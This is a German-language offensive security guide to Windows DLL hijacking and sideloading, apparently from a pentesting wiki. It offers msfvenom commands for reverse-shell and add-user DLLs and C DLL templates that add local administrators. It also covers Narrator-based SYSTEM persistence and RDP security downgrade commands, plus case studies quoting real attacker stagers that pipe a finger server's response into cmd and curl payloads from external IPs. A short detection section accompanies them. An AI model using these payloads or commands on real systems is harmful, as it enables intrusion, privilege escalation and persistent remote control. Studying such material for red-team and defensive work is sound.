- Wenn eine **DLL gefunden wird, deren Name mit dem einer bereits im Speicher geladenen DLL übereinstimmt**, umgeht das System die übliche Suche. Stattdessen prüft es, ob eine Umleitung und ein Manifest vorliegen, und verwendet andernfalls die bereits im Speicher befindliche DLL. **In diesem Szenario sucht das System nicht nach der DLL**.
- Wird eine DLL für die aktuelle Windows-Version als **bekannte DLL** erkannt, verwendet das System die Version dieser bekannten DLL sowie alle davon abhängigen DLLs, **ohne den Suchvorgang durchzuführen**. Der Registrierungsschlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser bekannten DLLs.
- Wenn eine **DLL Abhängigkeiten hat**, werden diese abhängigen DLLs gesucht, als wären sie ausschließlich durch ihre **Modulnamen** angegeben – unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad gefunden wurde.

### Privilegien eskalieren

**Voraussetzungen**:

- Einen Prozess identifizieren, der mit **anderen Privilegien** ausgeführt wird oder ausgeführt werden soll (horizontale oder laterale Bewegung) und dem eine **DLL fehlt**.
- Sicherstellen, dass **Schreibzugriff** auf ein beliebiges **Verzeichnis** besteht, in dem nach der **DLL** gesucht wird. Dies kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im Systempfad sein.

Diese Voraussetzungen sind standardmäßig selten erfüllt: Bei privilegierten ausführbaren Dateien fehlen normalerweise keine DLL-Abhängigkeiten, und Standardbenutzer können üblicherweise nicht in Verzeichnisse im System-Suchpfad schreiben. Fehlkonfigurierte Umgebungen können dennoch beide Bedingungen erfüllen.\
Sind die Voraussetzungen erfüllt, sieh dir das Projekt [UACME](https://github.com/hfiref0x/UACME) an. Obwohl es in erster Linie um UAC-Bypass geht, enthält es DLL-Hijacking-PoCs für bestimmte Windows-Versionen, die sich oft an das gefundene beschreibbare Verzeichnis anpassen lassen.

Beachte, dass du **deine Berechtigungen in einem Ordner** folgendermaßen **überprüfen kannst**:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Und **überprüfe die Berechtigungen aller Ordner in PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Du kannst auch die Imports einer ausführbaren Datei und die Exports einer DLL überprüfen mit:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Für eine vollständige Anleitung, wie du **DLL Hijacking missbrauchen kannst, um deine Privilegien zu erweitern**, wenn du Schreibrechte auf einen Ordner im **System Path** hast, siehe:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) prüft, ob du Schreibrechte auf einen Ordner innerhalb des System PATH hast.\
Weitere interessante automatisierte Tools zum Entdecken dieser Schwachstelle sind die **PowerSploit-Funktionen**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Beispiel

Falls du ein ausnutzbares Szenario findest, ist eines der wichtigsten Dinge für eine erfolgreiche Ausnutzung, **eine DLL zu erstellen, die mindestens alle Funktionen exportiert, die die ausführbare Datei daraus importiert**. Beachte außerdem, dass DLL Hijacking praktisch ist, um von mittlerer Integritätsstufe zu hoher **(unter Umgehung der UAC)** zu gelangen oder von[ **hoher Integrität zu SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ein Beispiel dafür, **wie man eine gültige DLL erstellt**, findest du in dieser Studie zu DLL Hijacking für die Ausführung: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Im **nächsten Abschnitt** findest du außerdem einige **einfache DLL-Codes**, die als **Vorlagen** oder zum Erstellen einer **DLL mit exportierten, nicht erforderlichen Funktionen** nützlich sein können.

## **DLLs erstellen und kompilieren**

### **DLL-Proxifizierung**

Ein **DLL-Proxy** ist im Grunde eine DLL, die **deinen bösartigen Code beim Laden ausführen** kann, aber auch **alle Aufrufe an die echte Bibliothek weiterleitet**, um diese **bereitzustellen** und wie **erwartet** zu **funktionieren**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du eine ausführbare Datei angeben und die zu proxifizierende Bibliothek auswählen, um eine **proxifizierte DLL zu generieren**, oder eine **DLL angeben** und eine **proxifizierte DLL generieren**.

### **Meterpreter**

**Reverse Shell abrufen (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Einen Meterpreter (x86) erhalten:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Einen Benutzer erstellen (x86, ich habe keine x64-Version gesehen):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Deine eigene

In vielen Fällen muss die von dir kompilierte DLL **jede vom Opferprozess importierte Funktion exportieren**. Fehlt ein erforderlicher Export, kann die Binärdatei ihn nicht auflösen und der Exploit schlägt fehl.

<details>
<summary>C-DLL-Vorlage (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>C++ DLL-Beispiel mit Benutzererstellung</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternative C-DLL mit Thread-Einstiegspunkt</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### NativeAOT-DLL mit durch Exporte ausgelöster Initialisierung

Eine eigenständige **.NET-NativeAOT-Shared-Library** kann als platzierte native DLL verwendet werden, ohne ein explizites `DllMain` zu implementieren. Exportiere statische C#-Methoden mit `[UnmanagedCallersOnly(EntryPoint = "...")]`; wenn der native Host einen dieser vom Compiler generierten Einstiegspunkte aufruft, initialisiert NativeAOT das Modul, und eine `[ModuleInitializer]`-Methode wird vor dem exportierten C#-Code ausgeführt. Die Ausgabe benötigt keine separat installierte .NET-Runtime.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

Die DLL benötigt weiterhin die **Exportnamen und ABI-kompatiblen Signaturen**, die der ausgewählte Host tatsächlich aufruft. Minimale Stubs können ausreichen, um die Initialisierung auszulösen. Fehlende Exporte können jedoch das Laden verhindern, und eine falsche Signatur kann den Aufruf beschädigen. Ermittle die Host-Imports und überprüfe das Ergebnis mit `dumpbin /exports payload.dll`, bevor du die Ausgabe in den vom Host erwarteten Abhängigkeitsnamen umbenennst.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>Minimale exportierte NativeAOT-DLL</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Konfiguriere das Projekt als eigenständige native Windows-Shared-Library:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Platziere die umbenannte DLL neben der kopierten, verwundbaren ausführbaren Datei und starte den Host über den Codepfad, der den kompatiblen Export aufruft. Dieser Initializer-Ansatz vermeidet es, komplexe Arbeit direkt in `DllMain` auszuführen, aber die Voraussetzungen für das Sideloading bleiben unverändert: Der Loader muss die Abhängigkeit anhand ihres Namens auflösen, das Anwendungsverzeichnis auswählen und darf sie nicht zuerst über KnownDLLs, ein bereits geladenes Modul, SxS-Umleitung oder eingeschränkte `LOAD_LIBRARY_SEARCH_*`-Flags finden.<sup>[[26]](#references)[[30]](#references)</sup>

Konventionelle native Vorlagen findest du unter [Windows C payloads](../windows-c-payloads.md). Eine per Sideloading geladene erste Stufe kann anschließend [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe) durchführen; dabei handelt es sich jedoch um eine separate Injection-Technik und nicht um einen Teil der DLL-Auflösung.

## Erkennung: DLL-Masquerading beim Laden von Bibliotheken

Elastic Defend 9.5.0 ergänzt ein Bibliotheksladeereignis um `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"`, wenn die geladene Datei nicht von Microsoft signiert ist und ihr Dateiname mit einem Eintrag im zwischengespeicherten Inventar von Elastic mit Windows-/System-DLL-Namen übereinstimmt. Dadurch werden der Abgleich mit dem Dateinameninventar sowie die Analyse des Systempfads und der Signatur in den Endpoint-Sensor verlagert; die zentrale EQL-Abfrage lässt sich daher reduzieren auf:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Behandle die Anreicherung als wertvollen Pivot, nicht als alleinigen Beweis. Erhöhe die Konfidenz, wenn ein signierter Host die DLL aus einem eigenen **vom Benutzer beschreibbaren** Verzeichnis lädt, die DLL nicht signiert oder nicht vertrauenswürdig ist und `dll.Ext.relative_file_creation_time` zeigt, dass sie kurz vor dem Laden erstellt wurde. Beschränke Ausnahmen auf die genaue Kombination aus Herausgeber, Hostprozess und Installationspfad. Unterdrücke einen kollidierenden DLL-Namen nicht global, da legitime Installationsprogramme und Anwendungen private Bibliotheken mit systemähnlichen Namen enthalten können.<sup>[[26]](#references)</sup>

Bei Sensoren ohne diese Anreicherung lässt sich das Verhalten näherungsweise erkennen, indem ein kollidierender DLL-Name mit einem Nicht-System-Ladepfad, einer fehlenden oder nicht vertrauenswürdigen Microsoft-Signatur und einem kurzen Zeitraum zwischen Dateierstellung und Laden korreliert wird. Dafür ist ein gepflegtes DLL-Namensinventar sowie eine eng gefasste Ausnahmeliste für `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` und andere genehmigte Bereitstellungspfade erforderlich.<sup>[[26]](#references)</sup>

## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Barrierefreiheit/ATs)

Windows Narrator.exe sucht beim Start weiterhin nach einer vorhersagbaren, sprachspezifischen Lokalisierungs-DLL, die für beliebige Codeausführung und Persistenz missbraucht werden kann.<sup>[[7]](#references)</sup>

Wesentliche Fakten
- Suchpfad (aktuelle Builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Älterer Pfad (ältere Builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Wenn am OneCore-Pfad eine beschreibbare, vom Angreifer kontrollierte DLL vorhanden ist, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Exports sind nicht erforderlich.

Erkennung mit Procmon
- Filter: `Process Name is Narrator.exe` und `Operation is Load Image` oder `CreateFile`.
- Starte Narrator und beobachte den versuchten Ladevorgang des oben genannten Pfads.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC: lautlos bleiben
- Ein naiver Hijack macht sich bemerkbar oder hebt die UI hervor. Um unauffällig zu bleiben, beim Attach die Threads von Narrator aufzählen, den Hauptthread öffnen (`OpenThread(THREAD_SUSPEND_RESUME)`) und ihn mit `SuspendThread` anhalten; in deinem eigenen Thread fortfahren. Den vollständigen Code findest du im PoC.<sup>[[8]](#references)</sup>

Auslösen und Persistenz über die Accessibility-Konfiguration
- Benutzerkontext (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit den obigen Einstellungen lädt der Start von Narrator die platzierte DLL. Auf dem sicheren Desktop (Anmeldebildschirm) CTRL+WIN+ENTER drücken, um Narrator zu starten; deine DLL wird als SYSTEM auf dem sicheren Desktop ausgeführt.

Durch RDP ausgelöste SYSTEM-Ausführung (laterale Bewegung)
- Klassische RDP-Sicherheitsebene zulassen: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Per RDP eine Verbindung zum Host herstellen und am Anmeldebildschirm CTRL+WIN+ENTER drücken, um Narrator zu starten; deine DLL wird als SYSTEM auf dem sicheren Desktop ausgeführt.
- Die Ausführung endet, wenn die RDP-Sitzung geschlossen wird – zügig injizieren/migrieren.

Bring Your Own Accessibility (BYOA)
- Du kannst einen integrierten Accessibility-Tool-Eintrag (AT) in der Registry klonen (z. B. CursorIndicator), so bearbeiten, dass er auf eine beliebige Binärdatei/DLL verweist, ihn importieren und anschließend `configuration` auf den Namen dieses AT setzen. Dadurch wird beliebige Ausführung über das Accessibility-Framework vermittelt.

Hinweise
- Zum Schreiben unter `%windir%\System32` und Ändern von HKLM-Werten sind Administratorrechte erforderlich.
- Die gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` untergebracht werden; Exports sind nicht erforderlich.

## Fallstudie: CVE-2025-1729 – Privilegieneskalation mit TPQMAssistant.exe

Dieser Fall zeigt **Phantom DLL Hijacking** in Lenovos TrackPoint Quick Menu (`TPQMAssistant.exe`), erfasst als **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Details zur Sicherheitslücke

- **Komponente**: `TPQMAssistant.exe` unter `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geplante Aufgabe**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` wird täglich um 9:30 Uhr im Kontext des angemeldeten Benutzers ausgeführt.
- **Verzeichnisberechtigungen**: Für `CREATOR OWNER` beschreibbar, sodass lokale Benutzer beliebige Dateien dort ablegen können.
- **DLL-Suchverhalten**: Versucht zuerst, `hostfxr.dll` aus dem Arbeitsverzeichnis zu laden, und protokolliert „NAME NOT FOUND“, wenn die DLL fehlt. Das weist darauf hin, dass die Suche das lokale Verzeichnis bevorzugt.

### Implementierung des Exploits

Ein Angreifer kann eine schädliche `hostfxr.dll`-Stub-Datei im selben Verzeichnis ablegen und so die fehlende DLL ausnutzen, um Code im Kontext des Benutzers auszuführen:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Angriffsablauf

1. Lege als Standardbenutzer `hostfxr.dll` unter `C:\ProgramData\Lenovo\TPQM\Assistant\` ab.
2. Warte, bis der geplante Task um 9:30 Uhr im Kontext des aktuellen Benutzers ausgeführt wird.
3. Wenn bei der Ausführung des Tasks ein Administrator angemeldet ist, wird die bösartige DLL in der Sitzung des Administrators mit mittlerer Integrität ausgeführt.
4. Kombiniere gängige UAC-Bypass-Techniken, um von mittlerer Integrität zu SYSTEM-Rechten zu gelangen.

## Fallstudie: MSI-CustomAction-Dropper + DLL-Side-Loading über einen signierten Host (wsc_proxy.exe)

Bedrohungsakteure kombinieren häufig MSI-basierte Dropper mit DLL-Side-Loading, um Payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.<sup>[[10]](#references)</sup>

Überblick über die Angriffskette
- Der Benutzer lädt eine MSI-Datei herunter. Eine CustomAction wird während der GUI-Installation unbemerkt ausgeführt (z. B. LaunchApplication oder eine VBScript-Aktion) und rekonstruiert die nächste Stufe aus eingebetteten Ressourcen.
- Der Dropper schreibt eine legitime, signierte EXE-Datei und eine bösartige DLL in dasselbe Verzeichnis (Beispielpaar: das von Avast signierte wsc_proxy.exe + das vom Angreifer kontrollierte wsc.dll).
- Beim Start der signierten EXE lädt die Windows-DLL-Suchreihenfolge zuerst wsc.dll aus dem Arbeitsverzeichnis und führt so den Angreifercode unter einem signierten übergeordneten Prozess aus (ATT&CK T1574.001).

MSI-Analyse (worauf zu achten ist)
- Tabelle CustomAction:
  - Suche nach Einträgen, die ausführbare Dateien oder VBScript ausführen. Beispiel für ein verdächtiges Muster: LaunchApplication führt eine eingebettete Datei im Hintergrund aus.
  - Untersuche in Orca (Microsoft Orca.exe) die Tabellen CustomAction, InstallExecuteSequence und Binary.
- Eingebettete/geteilte Payloads im MSI-CAB:
  - Administrative Extraktion: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Oder mit lessmsi: lessmsi x package.msi C:\out
  - Suche nach mehreren kleinen Fragmenten, die von einer VBScript-CustomAction verkettet und entschlüsselt werden. Typischer Ablauf:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktisches Sideloading mit wsc_proxy.exe
- Lege diese beiden Dateien im selben Ordner ab:
  - wsc_proxy.exe: legitimer signierter Host (Avast). Der Prozess versucht, wsc.dll anhand ihres Namens aus seinem Verzeichnis zu laden.
  - wsc.dll: Angreifer-DLL. Wenn keine bestimmten Exports erforderlich sind, reicht DllMain aus; andernfalls erstelle eine Proxy-DLL und leite erforderliche Exports an die echte Bibliothek weiter, während du den Payload in DllMain ausführst.
- Erstelle einen minimalen DLL-Payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Für Exportanforderungen solltest du ein Proxy-Framework (z. B. DLLirant/Spartacus) verwenden, um eine Forwarding-DLL zu generieren, die auch deine Payload ausführt.

- Diese Technik beruht auf der DLL-Namensauflösung durch die Host-Binärdatei. Verwendet der Host absolute Pfade oder sichere Ladeflags (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), schlägt der Hijack möglicherweise fehl.
- KnownDLLs, SxS und weitergeleitete Exports können die Priorität beeinflussen und müssen bei der Auswahl der Host-Binärdatei und des Export-Sets berücksichtigt werden.

## Signierte Triaden + verschlüsselte Payloads (ShadowPad-Fallstudie)

Check Point beschrieb, wie Ink Dragon ShadowPad mithilfe einer **Triade aus drei Dateien** einsetzt, um sich in legitime Software einzufügen und gleichzeitig die Kern-Payload auf dem Datenträger verschlüsselt zu halten:<sup>[[12]](#references)</sup>

1. **Signierte Host-EXE** – Anbieter wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen die ausführbare Datei um, sodass sie wie eine Windows-Binärdatei aussieht (zum Beispiel `conhost.exe`), während die Authenticode-Signatur gültig bleibt.
2. **Bösartige Loader-DLL** – wird neben der EXE unter einem erwarteten Namen abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist normalerweise eine mit dem ScatterBrain-Framework verschleierte MFC-Binärdatei; ihre einzige Aufgabe besteht darin, den verschlüsselten Blob zu finden, ihn zu entschlüsseln und ShadowPad per Reflective Loading abzubilden.
3. **Verschlüsselter Payload-Blob** – wird häufig als `<name>.tmp` im selben Verzeichnis gespeichert. Nachdem die entschlüsselte Payload in den Speicher abgebildet wurde, löscht der Loader die TMP-Datei, um forensische Spuren zu beseitigen.

Hinweise zur Vorgehensweise:

* Durch das Umbenennen der signierten EXE (bei Beibehaltung des ursprünglichen `OriginalFileName` im PE-Header) kann sie sich als Windows-Binärdatei tarnen und zugleich die Anbietersignatur behalten. Orientiere dich daher an Ink Dragons Vorgehen, `conhost.exe`-ähnliche Binärdateien abzulegen, bei denen es sich tatsächlich um AMD-/NVIDIA-Dienstprogramme handelt.
* Da die ausführbare Datei vertrauenswürdig bleibt, müssen bei den meisten Allowlisting-Kontrollen lediglich deine bösartige DLL daneben liegen. Konzentriere dich auf die Anpassung der Loader-DLL; der signierte übergeordnete Prozess kann in der Regel unverändert ausgeführt werden.
* Der Decryptor von ShadowPad erwartet, dass sich der TMP-Blob neben dem Loader befindet und beschreibbar ist, damit er die Datei nach dem Abbilden überschreiben kann. Lass das Verzeichnis beschreibbar, bis die Payload geladen wurde; danach kann die TMP-Datei für OPSEC bedenkenlos gelöscht werden.

### LOLBAS-Stager + Sideloading-Kette mit gestaffeltem Archiv (finger → tar/curl → WMI)

Operatoren kombinieren DLL-Sideloading mit LOLBAS, sodass das einzige benutzerdefinierte Artefakt auf dem Datenträger die bösartige DLL neben der vertrauenswürdigen EXE ist:<sup>[[1]](#references)</sup>

- **Remote-Command-Loader (Finger):** Ein verborgenes PowerShell startet `cmd.exe /c`, ruft Befehle von einem Finger-Server ab und leitet sie an `cmd` weiter:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` ruft Text über TCP/79 ab; `| cmd` führt die Serverantwort aus und ermöglicht es Operatoren, die zweite Stufe serverseitig auszutauschen.

- **Integrierter Download/Entpackvorgang:** Lade ein Archiv mit einer unverdächtigen Dateiendung herunter, entpacke es und platziere das Sideload-Ziel samt DLL in einem zufällig benannten `%LocalAppData%`-Ordner:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` blendet den Fortschritt aus und folgt Weiterleitungen; `tar -xf` verwendet das in Windows integrierte tar.

- **WMI/CIM-Start:** Starte die EXE über WMI, sodass die Telemetrie einen von CIM erstellten Prozess anzeigt, während dieser die DLL aus demselben Verzeichnis lädt:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Funktioniert mit Binaries, die lokale DLLs bevorzugen (z. B. `intelbq.exe`, `nearby_share.exe`); das Payload (z. B. Remcos) läuft unter dem vertrauenswürdigen Namen.

- **Jagd:** Bei `forfiles` alarmieren, wenn `/p`, `/m` und `/c` gemeinsam vorkommen; außerhalb von Admin-Skripten ist das ungewöhnlich.


## Fallstudie: NSIS-Dropper + Bitdefender Submission Wizard-Sideload (Chrysalis)

Bei einem jüngsten Eindringen von Lotus Blossom wurde eine vertrauenswürdige Update-Kette missbraucht, um einen mit NSIS gepackten Dropper auszuliefern, der einen DLL-Sideload sowie vollständig im Speicher laufende Payloads bereitstellte.<sup>[[13]](#references)</sup>

Ablauf der Tradecraft
- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert den Ordner als **HIDDEN**, legt eine umbenannte Bitdefender Submission Wizard-Datei `BluetoothService.exe`, eine bösartige `log.dll` und ein verschlüsseltes Blob `BluetoothService` ab und startet anschließend die EXE.
- Die Host-EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` lädt das Blob per mmap; `LogWrite` entschlüsselt es mit einem benutzerdefinierten LCG-basierten Stream (Konstanten **0x19660D** / **0x3C6EF35F**, Schlüsselmaterial aus einem vorherigen Hash abgeleitet), überschreibt den Puffer mit Klartext-Shellcode, gibt temporäre Daten frei und springt zu diesem.
- Um eine IAT zu vermeiden, löst der Loader APIs auf, indem er Exportnamen mit **FNV-1a basis 0x811C9DC5 + prime 0x1000193** hasht, anschließend einen Murmur-artigen Avalanche (**0x85EBCA6B**) anwendet und mit gesalzenen Ziel-Hashes vergleicht.

Haupt-Shellcode (Chrysalis)
- Entschlüsselt ein PE-artiges Hauptmodul, indem er über fünf Durchläufe wiederholt Addition/XOR/Subtraktion mit dem Schlüssel `gQ2JR&9;` durchführt, und lädt dann dynamisch `Kernel32.dll` → `GetProcAddress`, um die Auflösung der Importe abzuschließen.
- Rekonstruiert DLL-Namensstrings zur Laufzeit mithilfe von Bit-Rotate/XOR-Transformationen pro Zeichen und lädt anschließend `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Verwendet einen zweiten Resolver, der die **PEB → InMemoryOrderModuleList** durchläuft, jede Exporttabelle in 4-Byte-Blöcken mit Murmur-artigem Mixing parst und nur dann auf `GetProcAddress` zurückgreift, wenn der Hash nicht gefunden wird.

Eingebettete Konfiguration & C2
- Die Konfiguration befindet sich in der abgelegten Datei `BluetoothService` bei **Offset 0x30808** (Größe **0x980**) und wird mit dem Schlüssel `qwhvb^435h&*7` per RC4 entschlüsselt, wodurch die C2-URL und der User-Agent sichtbar werden.
- Beacons erstellen ein durch Punkte getrenntes Host-Profil, stellen das Tag `4Q` voran und verschlüsseln es dann mit dem Schlüssel `vAuig34%^325hGV` per RC4, bevor sie es über HTTPS mit `HttpSendRequestA` senden. Antworten werden per RC4 entschlüsselt und über einen Tag-Switch verarbeitet (`4T` Shell, `4V` Prozessausführung, `4W/4X` Dateischreiben, `4Y` Lesen/Exfiltration, `4\\` Deinstallation, `4` Laufwerks-/Dateiauflistung + Fälle mit segmentierter Übertragung).
- Der Ausführungsmodus wird durch CLI-Argumente gesteuert: keine Argumente = Persistenzinstallation (Service/Run-Key), die auf `-i` verweist; `-i` startet sich selbst mit `-k` neu; `-k` überspringt die Installation und führt das Payload aus.

Beobachteter alternativer Loader
- Bei demselben Eindringen wurden Tiny C Compiler abgelegt und `svchost.exe -nostdlib -run conf.c` aus `C:\ProgramData\USOShared\` ausgeführt, mit `libtcc.dll` daneben. Der vom Angreifer bereitgestellte C-Quellcode enthielt Shellcode, wurde kompiliert und im Speicher ausgeführt, ohne ein PE auf die Festplatte zu schreiben. So lässt sich das nachstellen:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- In dieser TCC-basierten Compile-and-Run-Phase wurde `Wininet.dll` zur Laufzeit importiert und Shellcode für eine zweite Stufe von einer fest codierten URL geladen. So entstand ein flexibler Loader, der sich als Compilerlauf tarnte.

## Sideloading über einen signierten Host mit Export-Proxying + Host-Thread-Parking

Einige DLL-Sideloading-Ketten setzen **Stabilitätsmaßnahmen** ein, damit der legitime Host lange genug aktiv bleibt, um spätere Stufen sauber zu laden, statt nach dem Laden der schädlichen DLL abzustürzen.<sup>[[11]](#references)</sup>

Beobachtetes Muster
- Eine vertrauenswürdige EXE neben einer schädlichen DLL mit dem erwarteten Abhängigkeitsnamen ablegen, zum Beispiel `version.dll`.
- Die schädliche DLL **proxyt jeden erwarteten Export** an die echte System-DLL weiter (zum Beispiel `%SystemRoot%\\System32\\version.dll`), sodass die Importauflösung weiterhin funktioniert und der Host-Prozess weiterläuft.
